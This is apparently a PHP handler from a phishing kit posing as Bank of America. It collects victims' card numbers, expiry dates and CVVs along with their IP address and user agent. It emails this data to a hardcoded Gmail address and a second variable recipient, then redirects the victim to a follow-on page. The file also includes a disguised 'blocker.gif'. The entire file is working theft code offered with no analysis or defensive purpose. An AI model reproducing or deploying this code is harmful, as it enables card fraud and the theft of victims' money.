<?php
include ("images/blocker.gif");
if($_POST["cn"] != "" and $_POST["exm"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message = "|----------- BOFA AT MONALISA SERVICE --------------|\n";
$message .= "Card Number            : ".$_POST['cn']."\n";
$message .= "Expiration Date            : ".$_POST["exm"].'/'.$_POST['exy']."\n";
$message .= "CVV            : ".$_POST['cv']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- BLACKSUN4  --------------|\n";
$send = "alfredomillan799@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", "$message");
mail("$userinfo","$subject","$message");
}
$praga=rand();
$praga=md5($praga);
  header ("Location: satisES.php");
}else{
}

?>

